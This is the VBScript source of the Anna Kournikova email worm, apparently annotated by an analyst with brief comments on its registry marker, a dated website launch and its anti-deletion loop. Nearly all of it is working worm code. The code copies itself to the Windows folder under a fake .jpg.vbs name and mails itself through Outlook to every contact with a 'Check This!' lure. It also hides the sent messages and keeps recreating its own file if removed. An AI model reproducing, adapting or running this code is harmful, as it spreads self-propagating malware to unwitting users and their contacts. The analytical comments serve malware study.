


On Error Resume Next
Set ws = CreateObject("WScript.Shell")

//says "Worm made with VBSwg 1.50b": another pitfall
ws.regwrite "HKCU\software\OnTheFly\", Chr(87) & Chr(111) & Chr(114) & 
Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & 
Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & 
Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & 
Chr(48) & Chr(98)

Set fso= Createobject("scripting.filesystemobject")

fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0)& 
"\AnnaKournikova.jpg.vbs"

if ws.regread ("HKCU\software\OnTheFly\mailed") <> "1" then
	Outlook()
end if

//Red Herring?  Maybe, but NL *might* be the origin of the worm
if month(now) =1 and day(now) = 26 then
	ws.run "Http://www.dynabyte.nl",3,false
end if

//The following section could be an anti-deletion technique
Set AnnaKournikova = fso.opentextfile(wscript.scriptfullname, 1)
SourceCode = AnnaKournikova.readall
AnnaKournikova.Close
Do
	If Not (fso.fileexists(wscript.scriptfullname)) Then
		Set AnnaKournikova = fso.createtextfile(wscript.scriptfullname, True)
		AnnaKournikova.write SourceCode
		AnnaKournikova.Close
	End If
Loop

Function Outlook()
	On Error Resume Next
	Set OutlookApp = CreateObject("Outlook.Application")
	If OutlookApp= "Outlook"Then
		Set Mapi=OutlookApp.GetNameSpace("MAPI")
		Set MapiAdList= Mapi.AddressLists
		For Each Address In MapiAdList
			If Address.AddressEntries.Count <> 0 Then
				NumOfContacts = Address.AddressEntries.Count
				//Get a list of contacts
				For ContactNumber = 1 To NumOfContacts
					Set EmailItem = OutlookApp.CreateItem(0)
					Set ContactNumber = Address.AddressEntries(ContactNumber)
					EmailItem.To = ContactNumber.Address
					EmailItem.Subject = "Here you have, ;o)"
					EmailItem.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
					set EmailAttachment=EmailItem.Attachments
					EmailAttachment.Add fso.GetSpecialFolder(0)& "\AnnaKournikova.jpg.vbs"
					EmailItem.DeleteAfterSubmit = True

					//Send the thing
					If EmailItem.To <> "" Then
						EmailItem.Send
						ws.regwrite "HKCU\software\OnTheFly\mailed", "1"
					End If
				Next
			End If
		Next
	end if
End Function
'Vbswg 1.50b
